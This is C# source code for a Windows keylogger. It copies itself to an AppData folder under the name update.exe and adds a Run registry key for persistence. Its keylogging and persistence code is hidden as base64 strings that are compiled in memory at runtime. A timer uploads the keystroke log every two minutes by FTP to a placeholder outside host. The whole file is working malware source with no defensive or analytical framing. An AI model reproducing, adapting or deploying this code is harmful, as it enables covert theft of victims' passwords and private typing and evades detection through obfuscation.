using System;
using System.CodeDom.Compiler;
using System.IO;
using Microsoft.CSharp;
using System.Reflection;
using System.Text;
using System.Net;
using System.Timers;

namespace capto
{
    class Program
    {
        static readonly string addtoregistry = "dXNpbmcgTWljcm9zb2Z0LldpbjMyOw0KdXNpbmcgU3lzdGVtOw0KDQpuYW1lc3BhY2UgUHJvZ3JhbQ0Kew0KICAgIHB1YmxpYyBjbGFzcyBQcm9ncmFtDQogICAgew0KICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgTWFpbihzdHJpbmcgYXJnKQ0KICAgICAgICB7DQogICAgICAgICAgICBSZWdpc3RyeUtleSBrZXkgPSBSZWdpc3RyeS5DdXJyZW50VXNlci5DcmVhdGVTdWJLZXkoQCJTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iKTsNCiAgICAgICAgICAgIGtleS5TZXRWYWx1ZSgiV2luZG93cyIsIHN0cmluZy5Gb3JtYXQoQCJ7MH1cezF9XHsyfSIsIEVudmlyb25tZW50LkdldEZvbGRlclBhdGgoRW52aXJvbm1lbnQuU3BlY2lhbEZvbGRlci5BcHBsaWNhdGlvbkRhdGEpLCAiV2luZG93cyIsICJ1cGRhdGUuZXhlIikpOw0KICAgICAgICAgICAga2V5LkNsb3NlKCk7DQogICAgICAgIH0NCiAgICB9DQp9";
        static readonly string startkeylogger = "dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KDQpuYW1lc3BhY2UgUHJvZ3JhbQ0KeyAgICBwdWJsaWMgY2xhc3MgUHJvZ3JhbQ0KICAgIHsNCiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXQ0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgR2V0QXN5bmNLZXlTdGF0ZShJbnQzMiBpKTsNCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgTWFpbihzdHJpbmcgYXJncykNCiAgICAgICAgew0KICAgICAgICAgICAgc3RyaW5nIHBhdGggPSBzdHJpbmcuRm9ybWF0KEAiezB9XHsxfVx7Mn0iLCBFbnZpcm9ubWVudC5HZXRGb2xkZXJQYXRoKEVudmlyb25tZW50LlNwZWNpYWxGb2xkZXIuQXBwbGljYXRpb25EYXRhKSwgIldpbmRvd3MiLCAidXBkYXRlLmxvZyIpOw0KDQogICAgICAgICAgICB3aGlsZSAodHJ1ZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IDI1NTsgaSsrKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaW50IGtleSA9IEdldEFzeW5jS2V5U3RhdGUoaSk7DQogICAgICAgICAgICAgICAgICAgIGlmIChrZXkgPT0gMSB8fCBrZXkgPT0gMzI3NjkpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIFN0cmVhbVdyaXRlciBmaWxlID0gbmV3IFN0cmVhbVdyaXRlcihwYXRoLCB0cnVlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUuV3JpdGUoKGNoYXIpaSk7DQogICAgICAgICAgICAgICAgICAgICAgICBmaWxlLkNsb3NlKCk7DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCn0=";

        static void Main(string[] args)
        {
            string finalpath = string.Format(@"{0}\{1}\{2}", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Windows", "update.exe");
            string currentpath = Assembly.GetExecutingAssembly().Location;

            // If never run before: copy to destination, add to registry and execute
            if (!File.Exists(finalpath))
            {
                File.Copy(currentpath, finalpath);
                CompileAndRun(Base64Decoder(addtoregistry));
                System.Diagnostics.Process.Start(finalpath);
            }
            // If run before: start logger and timer for ftp file upload
            else
            {
                Timer timer = new Timer();
                timer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
                timer.Interval = 60000 * 2;
                timer.Enabled = true;

                CompileAndRun(Base64Decoder(startkeylogger));
            }
        }

        static void CompileAndRun(string payload)
        {
            CompilerParameters CompilerParams = new CompilerParameters
            {
                GenerateInMemory = true,
                TreatWarningsAsErrors = false,
                GenerateExecutable = false,
                CompilerOptions = "/optimize"
            };

            string[] references = { "System.dll", "mscorlib.dll" };
            CompilerParams.ReferencedAssemblies.AddRange(references);

            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerResults compile = provider.CompileAssemblyFromSource(CompilerParams, payload);

            Module module = compile.CompiledAssembly.GetModules()[0];
            Type mt = null;
            MethodInfo methInfo = null;

            if (module != null)
                mt = module.GetType("Program.Program");
            if (mt != null)
                methInfo = mt.GetMethod("Main");
            if (methInfo != null)
                methInfo.Invoke(null, new object[] { "arg" });
        }

        private static void OnTimedEvent(object source, ElapsedEventArgs e)
        {
            string finalpath = string.Format(@"{0}\{1}\{2}", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Windows", "update.log");
            string tmppath = string.Format(@"{0}\{1}\{2}", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Windows", "update.log1");

            if (File.Exists(finalpath))
            {
                File.Copy(finalpath, tmppath, true);

                using (var client = new WebClient())
                {
                    client.Credentials = new NetworkCredential("<username>", "<password>");
                    client.UploadFile("ftp://host/update.log", WebRequestMethods.Ftp.UploadFile, tmppath);
                }
            }
        }
      
        static string Base64Decoder(string base64encodedstring)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(base64encodedstring));
        }
    }
}